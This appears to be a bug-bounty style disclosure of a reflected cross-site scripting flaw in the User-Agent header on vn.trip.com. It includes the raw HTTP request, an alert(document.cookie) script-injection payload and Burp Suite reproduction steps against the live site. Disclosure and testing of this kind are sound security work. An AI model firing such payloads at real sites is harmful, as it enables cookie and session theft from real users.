# Reflected-XSS-in-TRIP-com

Reflected XSS in User-Agent on https://vn.trip.com/
I.	  Summary
-	The application reflects the User-Agent HTTP header directly into the HTML response without proper sanitization, allowing an attacker to execute arbitrary JavaScript in the victim’s browser. 
II.	Affected Endpoint
-	GET https://vn.trip.com/?locale=vi-VN&curr=VND
III.	Steps to Reproduce
1.	Send an HTTP request to the following endpoint with a malicious payload  appended to the end of the existing User-Agent value:
2.	GET /?locale=vi-VN&curr=VND HTTP/2
3.	Host: vn.trip.com
4.	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) </script><script>alert(document.cookie)</script>
5.	Open the response in a browser.
6.	Observe that a JavaScript alert is executed, confirming reflected XSS.
   
IV.	Proof of Concept
-	Payload: </script><script>alert(document.cookie)</script>
-	Login in https://vn.trip.com/?locale=vi-VN&curr=VND
  ![Burp Request](images/User-login-in-Trip.png)
-	Reload the page and modify the request in the browser in URL: https://vn.trip.com/?locale=vi-VN&curr=VND in BurpSuite Intercept On
  ![Burp Request](images/Modify-request-1.png)
 	![Burp Request](images/Modify-request-2.png)

-	Observe that the JavaScript payload is executed and an alert dialog is displayed in browser
  ![Burp Request](images/Observe-reponse-in-Browser-1.png)
  ![Burp Request](images/Observe-reponse-in-Browser-1.png)
 
 
